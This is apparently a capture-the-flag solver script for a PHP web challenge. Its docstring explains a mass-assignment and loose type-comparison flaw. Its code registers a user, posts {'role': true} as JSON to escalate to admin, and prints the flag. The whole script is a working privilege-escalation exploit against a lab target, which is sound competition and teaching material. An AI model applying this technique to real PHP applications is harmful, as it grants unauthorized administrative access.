#!/usr/bin/env python3
"""
Solver for web/juggler (CSAW 2026 Quals) -- blind, no reference solve.

Vulnerability chain (PHP type juggling + mass assignment), found by
reading src/*.php:

1. src/profile_update.php (reachable via POST to dashboard.php with
   Content-Type: application/json) does blind mass assignment:

       foreach ($jsonData as $jsonKey => $jsonValue) {
           if (array_key_exists($jsonKey, $_SESSION))
               $_SESSION[$jsonKey] = $jsonValue;
           if (in_array($jsonKey, $dbColumns, true))
               ... UPDATE users SET `$jsonKey` = ? ...
       }

   "role" is both a $_SESSION key (set at login from the DB) and a
   `users` table column, and nothing restricts $jsonValue's TYPE -- it's
   whatever json_decode() produced. So we can set $_SESSION["role"]
   directly to a PHP bool, not just a string.

2. public/admin.php checks:

       if (!isset($_SESSION["role"]) || !in_array($_SESSION["role"], $adminRoles))
           header("Location: index.php");

   in_array() here uses LOOSE (==) comparison (no `true` 3rd arg). The
   admin role values are randomized 32-char strings at container build
   time (Dockerfile), so they can't be guessed -- but they don't need to
   be: in PHP, `bool == non-empty-non-"0"-string` is TRUE (the string is
   cast to bool). So sending {"role": true} makes
   in_array(true, [<any non-empty strings>]) return true regardless of
   what the actual (unguessable) admin role strings are.

   "at least one is assigned an airborne trajectory" (challenge
   description) = role gets ASSIGNED a boolean (true/false aren't
   strings -- they're "in the air", not grounded as the expected type).

Chain: register -> login -> POST {"role": true} to dashboard.php as JSON
-> GET admin.php -> flag.

Usage:
    python3 exploit.py <base_url>
    e.g. python3 exploit.py http://127.0.0.1:8099
"""
import re
import sys
import json
import secrets

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8099"


def csrf_from_html(html):
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
    if not m:
        raise RuntimeError("could not find csrf_token in page")
    return m.group(1)


def main():
    s = requests.Session()

    print("[*] registering a fresh account...")
    r = s.get(BASE + "/register.php")
    csrf = csrf_from_html(r.text)
    username = "solver_" + secrets.token_hex(4)
    password = secrets.token_hex(8)
    r = s.post(BASE + "/register.php",
               data={"csrf_token": csrf, "username": username, "password": password},
               allow_redirects=False)
    print(f"    registered {username!r} (status {r.status_code})")

    print("[*] logging in...")
    r = s.get(BASE + "/login.php")
    csrf = csrf_from_html(r.text)
    r = s.post(BASE + "/login.php",
               data={"csrf_token": csrf, "username": username, "password": password},
               allow_redirects=False)
    if r.status_code != 302 or "dashboard" not in r.headers.get("Location", ""):
        print("[-] login failed:", r.status_code, r.headers.get("Location"))
        sys.exit(1)
    print("    logged in, redirected to", r.headers.get("Location"))

    print("[*] fetching fresh csrf_token from dashboard...")
    r = s.get(BASE + "/dashboard.php")
    csrf = csrf_from_html(r.text)

    print("[*] type-juggling: POST {'role': true} as JSON to dashboard.php...")
    r = s.post(
        BASE + "/dashboard.php",
        data=json.dumps({"csrf_token": csrf, "username": username, "role": True}),
        headers={"Content-Type": "application/json"},
    )
    print("    response:", r.status_code, r.text)
    body = {}
    try:
        body = r.json()
    except ValueError:
        pass
    if body.get("status") != "success":
        print("[-] profile_update did not report success")
        sys.exit(1)

    print("[*] GET /admin.php ...")
    r = s.get(BASE + "/admin.php")
    m = re.search(r"csaw\{[^}]+\}", r.text)
    if not m:
        print("[-] no flag in admin.php response; were we redirected?")
        print(r.text[:500])
        sys.exit(1)
    print(f"\n[+] FLAG: {m.group(0)}")


if __name__ == "__main__":
    main()
